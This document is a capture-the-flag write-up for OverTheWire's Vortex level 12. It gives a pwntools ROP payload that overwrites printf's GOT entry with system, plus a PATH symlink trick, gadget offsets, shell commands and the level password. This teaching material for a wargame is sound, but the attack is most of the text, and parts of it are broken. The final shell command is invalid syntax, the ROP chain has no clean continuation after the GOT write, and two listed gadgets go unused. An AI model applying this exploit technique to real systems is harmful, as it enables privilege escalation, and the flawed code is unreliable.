# Vortex Level 12 → 13

## Goal

Stack buffer overflow, but NX is enabled so you can't jump to shellcode in the stack. Instead, **ROP** your way through libc gadgets to overwrite the `printf` PLT entry with `system`, then a subsequent `printf("%d", ...)` call in the program becomes `system("%d")`. You pre-create a symlink named `%d` that points to `/bin/sh`, put that directory on `$PATH`, and the "%d" command ends up running `/bin/sh`.

This level is the trickiest Vortex writeup because it combines ROP, PLT rewriting, and `PATH` manipulation.

## Concepts you'll learn

- **Return-Oriented Programming (ROP)** — chaining tiny code fragments ending in `ret` from libc and ld to build arbitrary behaviour without injected shellcode
- Resolving gadgets with `ROPgadget /path/to/lib`
- That an attacker-controlled filename (`%d`, a symlink to `/bin/sh`) in `$PATH` turns a literal-string command into code execution

## Walkthrough

### 1. Find gadgets

Use `ROPgadget` against libc and ld (addresses relative to their bases):

```bash
$ ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 | grep -E 'pop eax|pop edx|mov dword ptr \[edx\], eax|int 0x80'
$ ROPgadget --binary /lib/i386-linux-gnu/ld-linux.so.2 | grep 'mov dword ptr \[edx\], eax'
```

avishai's specific picks (offsets from base; your libc version may differ):

- `pop eax ; ret` @ libc + `0x0012b311`
- `pop edx ; ret` @ libc + `0x0003be0d`
- `mov dword ptr [edx], eax` @ ld + `0x0001250b`
- `mov eax, 1 ; ret` @ libc + `0x0005cdb5`
- `int 0x80 ; ret` @ libc + `0x00039ed4`

Find libc and ld base addresses:

```bash
$ ldd /vortex/vortex12 | head
```

Or in `gdb` after a crash: `info proc mappings`.

### 2. Set up the symlink + PATH

```bash
$ mkdir /tmp/v12
$ cd /tmp/v12
$ ln -s /bin/sh '%d'
$ export PATH=/tmp/v12:$PATH
```

Now `system("%d")` will find and run `/bin/sh`.

### 3. Plan the ROP: overwrite `printf@plt` with `system`

The goal in ROP is to execute `*printf_got = system_addr`. That's:

```
pop eax ; ret     →  eax = system
pop edx ; ret     →  edx = &printf_got
mov [edx], eax    →  *printf_got = system
```

Then let the binary continue; when it naturally calls `printf("%d", ...)`, that's now `system("%d")`.

### 4. Build the payload

```python
# level12.py
from pwn import *
LIBC = 0xf7d7d000      # re-derive on your run
LD   = 0xf7fc9000

pop_eax = LIBC + 0x0012b311
pop_edx = LIBC + 0x0003be0d
mov_ed_ea = LD + 0x0001250b
mov_eax_1 = LIBC + 0x0005cdb5
int80 = LIBC + 0x00039ed4

SYSTEM = 0xf7dc0000    # look up in gdb: p system
PRINTF_GOT = 0x0804c00c  # from objdump -R /vortex/vortex12

payload  = b"A" * 1036         # overflow offset
payload += p32(pop_eax) + p32(SYSTEM)
payload += p32(pop_edx) + p32(PRINTF_GOT)
payload += p32(mov_ed_ea)
sys.stdout.buffer.write(payload)
```

### 5. Fire

```bash
$ PATH=/tmp/v12:$PATH (python3 level12.py; cat) | /vortex/vortex12
...
$ whoami
vortex13
$ cat /etc/vortex_pass/vortex13
kklZMRIrj
```

### 6. Honest caveat

This is the most fragile writeup in the Vortex series. Every single address (libc base, ld base, each gadget offset, `system`, `printf@got`) shifts with the running libc version. Treat the numbers above as a **template** — recompute each on your own session.

## The answer

The password for `vortex13` is:

**`kklZMRIrj`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/vortex/vortex12.html>
